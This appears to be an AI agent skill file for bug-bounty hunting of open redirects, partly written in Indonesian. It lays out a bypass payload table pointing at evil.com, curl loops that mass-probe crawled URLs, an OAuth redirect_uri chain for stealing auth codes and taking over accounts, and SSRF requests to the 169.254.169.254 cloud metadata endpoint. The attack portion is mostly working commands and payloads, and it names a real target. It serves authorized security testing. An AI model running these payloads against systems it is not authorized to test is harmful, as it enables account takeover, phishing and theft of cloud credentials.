---
name: hunt-open-redirect
description: Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect bugs or building ATO chains.
sources: hackerone_public
report_count: 28
---

# HUNT-OPEN-REDIRECT — Open Redirect

## Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.com
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

## Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

## Bypass Table

| Technique | Payload |
|-----------|---------|
| Basic | `https://evil.com` |
| Protocol relative | `//evil.com` |
| Backslash bypass | `/\\evil.com` |
| At-sign confusion | `https://target.com@evil.com` |
| Double slash | `//evil.com/%2F..` |
| URL encoding | `%2Fevil.com` |
| Null byte | `evil.com%00target.com` |
| Whitespace | `evil.com%09` or `%20` |
| JavaScript URI | `javascript:window.location='https://evil.com'` |
| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
| Subdomain | `https://target.com.evil.com` |
| Fragment | `https://evil.com#.target.com` |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover Redirect Parameters
```bash
# Extract all redirect candidates from crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Less common param names
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
```

### Phase 2 — Basic Test
```bash
COLLAB="https://evil.com"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

### Phase 3 — Bypass Techniques
```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://evil.com"
  "//evil.com"
  "/\\evil.com"
  "https://$TARGET@evil.com"
  "https://evil.com%23.$TARGET"
  "https://evil.com%09"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P → $LOC"
done
```

### Phase 3b — DOM-based open redirect (client-side sink)
Server-side `Location:` grepping misses redirects that happen purely in JS. Source (`location.hash`/`location.search`/`document.referrer`) assigned to a navigation sink.
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
# Confirm in a browser (curl can't): open  https://$TARGET/page#https://evil.com  (or ?url=...)
# Common shape:  var u=new URLSearchParams(location.search).get('url'); location=u;
```
(PortSwigger: DOM-based open redirection.)

### Phase 4 — OAuth Chain Test
```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.com/callback
# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

### Phase 5 — Server-Side Redirect (SSRF escalation)
```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

### Phase 3c — encoded absolute-URL parameter driving a client-side `location.href` (base64 uri)

Signature (verified live, finanzen.net VDP 2026-10-16, login.finanzen.net/federated-signin):
minified SPA route handler does `const u = params.get("uri"); const d = atob(u);
isValid(d) ? location.href = d : ...` where `isValid` only checks `protocol === "http:" ||
protocol === "https:"`. The host is never compared to anything, so any absolute URL works. Harvest
these from route chunks (`atob(` / `decodeURIComponent(` near `location.href`), and note when the
vendor's own flow embeds the endpoint — an `appleSignInUri`/`logout_uri` built from
`federated-signin?uri=<b64>` in the app's `/api/oauth2/features` response proves the handler is
load-bearing, not dead code.

Proof ladder for client-side redirects (curl only sees the SPA shell — there is no `Location:`
header):

```bash
python3 -c "import base64;print(base64.b64encode(b'https://<in-scope-sibling-host>/').decode())"
# 1) headless Chrome direct, 3x: --dump-dom "<start-url>?uri=<b64>" -> final DOM is the OFF-SITE
#    host's answer (an Akamai interstitial even quotes it: access "http://<host>/")
# 2) chain capture: mitmdump -p 8888 (check the port is free first; fall back to 8888+)
#    + Chrome --proxy-server=http://127.0.0.1:8888 --ignore-certificate-errors
#    grep the log:  GET <start-url>  ->  GET <off-site target>   and attach that excerpt
```

Rules: use an **in-scope** host as the redirect target so no third party is touched; validate 3x;
severity stays Low (phishing aid) unless tokens/code land on the redirect target (then chain per
the Chain Table). An interstitial/deny page as the landing is acceptable evidence — it names the
host the browser actually requested.

---

## Automation
```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

# nuclei
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# gf + qsreplace
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
```

---

## Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

## Validation

✅ Location header in response points to evil.com (your controlled domain)
✅ Browser follows redirect to attacker-controlled page

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Survei parameter: `next`, `url`, `redirect`, `return`, `continue`, `dest` | Temukan sink |
| 2 | `//evil.com` & `/\evil.com` | Parser URL longgar |
| 3 | `@` trick: `https://target.com@evil.com` | Userinfo menipu |
| 4 | Whitelist bypass: `target.com.evil.com`, `target.com@evil` | Validasi awalan |
| 5 | Rantai nyata: OAuth `redirect_uri`, reset link, SSO callback | Tanpa rantai = Low |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa mengarahkan korban ke domain penyerang melalui parameter `next` di alur login" — tunjukkan redirect nyata.
2. **Apa yang hilang dari korban?** Tanpa rantai (OAuth, reset), dampak biasanya phishing. Sebutkan rantai kalau ada.
3. **Bisa direproduksi 10 menit dari nol?** Sertakan URL dan header `Location` respons.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** arahkan korban ke domain attacker

**Teknik pengembangan:** redirect_uri OAuth -> curi token; bypass filter SSRF; phishing token reset

**Eskalasi ke:** `hunt-oauth` · `hunt-ato` · `hunt-ssrf`

**Depth target:** L2 -> L4

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## 2026 sweep (dork pass 2026-10-26 — advisori terverifikasi)

- **CVE-2026-46546 — Frappe LMS: header tag injection leading to open redirect.**
  Lesson: injeksi tag header (`<meta http-equiv=refresh>`, `Location`) pada halaman yang dirender adalah open redirect tanpa parameter redirect sama sekali — sink-nya adalah render, bukan parameter.
- **CVE-2026-33149 — Tandoor Recipes: Host Header Injection.** Bukan redirect klasik, tapi pola berbagi: header yang dipercaya membangun URL absolut.
  Lesson: kalau aplikasi membangun URL absolut dari header request, setiap halaman yang me-redirect bisa menjadi open redirect.

**Aturan severity:** open redirect sendirian biasanya Low. Yang membuatnya bernilai: posisinya di jalur keamanan (OAuth `redirect_uri`, callback SSO, link reset password) **dan** rantai yang bisa dibuktikan sampai pencurian token. Kalau pembuktian kebocoran token butuh akun yang tidak kamu punya, laporkan redirect-nya saja dan nyatakan rantai ATO-nya belum terverifikasi.


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

`redirect_uri`/`next`/`url` attacker-controlled → OAuth code theft → ATO; bypass via `//`, `/\/`, `@`, `#`, encoded slash. Kalibrasi: redirect yang divalidasi terhadap allowlist host = correct; redirect tanpa sink OAuth/token = Low.
